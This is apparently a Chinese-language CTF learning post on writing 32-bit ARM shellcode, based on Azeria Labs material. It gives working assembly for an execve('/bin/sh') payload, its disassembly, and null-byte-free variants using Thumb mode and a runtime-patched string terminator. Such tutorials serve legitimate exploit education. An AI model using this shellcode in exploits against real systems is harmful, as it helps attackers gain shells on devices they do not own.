# Arm Pwn Shellcode


之前一直对 Arm pwn 不了解，但 CTF 中 Arm pwn 出现频率还是挺高的。Defcon qual 2021 也有一道比较简单的 Arm pwn。编写 Shellcode 是漏洞利用的基础，因此从它开始入门 Arm pwn。主要参考 [wrting arm shellcode](https://azeria-labs.com/writing-arm-shellcode/), 系统环境是 [azeria lab vm 2.0](https://azeria-labs.com/lab-vm-2-0/)。
<!--more-->

## 系统调用
一般情况下执行 shellcode 的目的是弹出一个shell，即 `execve("/bin/sh", 0, 0)`。32 bit arm 系统调用号通过 r7传递，参数依次保存在 r0 - r6。汇编代码如下：
```Assembly
.section .text
.global _start

_start:
    add r0, pc, #12
    mov r1, #0
    mov r2, #0
    mov r7, #11
    svc #0

.ascii "/bin/sh\0"
```

## 去除 Null Byte
上面的汇编代码经过汇编后得到的机器指令中含有非常多的 null byte，这对 shellcode 来说是非常致命的。因为漏洞函数往往会被 null byte 截断。
```
$ objdump -d execv

execv:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:       e28f000c        add     r0, pc, #12
   10058:       e3a01000        mov     r1, #0
   1005c:       e3a02000        mov     r2, #0
   10060:       e3a0700b        mov     r7, #11
   10064:       ef000000        svc     0x00000000
   10068:       6e69622f        .word   0x6e69622f
   1006c:       0068732f        .word   0x0068732f
```
需要注意的是在 x86 架构下 pc 的值是下一条指令的地址，而在 arm 架构中 pc 的值是下下条指令的地址。

### 指令部分
对于指令中的 null byte 可以通过使用 Thumb mode 来去除。
```Assembly
.section .text
.global _start

_start:
    .code 32
    add r3, pc, #1
    bx r3

    .code 16
    add r0, pc, #8
    eor r1, r1, r1
    eor r2, r2, r2
    mov r7, #11
    svc #1
    mov r5, r5

.ascii "/bin/sh\0"
```
其中 `mov r5, r5` 用于对齐。

### 字符串部分
上面的汇编代码得到的机器码是不含 null byte 的，但作为参数的字符串末尾却必须包含一个 null byte。解决方法是先在目标位置存放一个任意非 0 的值，然后在运行时将它置 0。
```Assembly
.section .text
.global _start

_start:
    .code 32
    add r3, pc, #1
    bx r3

    .code 16
    add r0, pc, #8
    eor r1, r1, r1
    eor r2, r2, r2
    strb r2, [r0, #7]
    mov r7, #11
    svc #1

.ascii "/bin/shx"
```

## 测试 Shellcode
链接时默认 .text 段不可写，而 `/bin/sh` 在 .text 段中。使用 `-N` 使其可写。
```
ld --help | grep 'readonly'
  -N, --omagic                Do not page align data, do not make text readonly
  --no-omagic                 Page align data, make text readonly
```
